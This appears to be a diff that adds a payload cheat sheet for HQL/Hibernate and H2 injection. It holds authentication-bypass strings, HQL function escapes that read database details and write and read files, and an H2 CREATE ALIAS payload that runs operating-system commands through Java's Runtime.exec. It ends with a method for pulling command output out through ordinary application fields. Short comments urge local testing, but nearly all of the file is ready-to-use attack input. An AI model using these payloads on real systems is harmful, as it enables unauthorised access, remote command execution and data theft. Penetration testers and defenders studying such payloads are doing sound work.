@@ -1,0 +1,25 @@
+# HQL/Hibernate + H2 probe snippets
+# Adapt quoting to the injection context. Prefer local/container testing first.
+
+# String-context auth bypass probes
+" or 1=1 or "a"="a
+') or 1=1 or ('a'='a
+\" or 1=1 or \"a\"=\"a
+
+# HQL function escape probes
+function('DATABASE')
+function('USER')
+function('CSVWRITE','/tmp/hql_probe.csv','select 1')
+function('CSVREAD','/tmp/hql_probe.csv')
+
+# Field-selector style probes
+id
+id, function('DATABASE')
+id from User u where 1=1 --
+
+# H2 alias idea (version-dependent; test locally)
+CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; } $$;
+CALL SHELLEXEC('id');
+
+# No-egress exfil pattern
+# Instead of reverse shell, write command output into an application table/session/user field and retrieve through normal API.
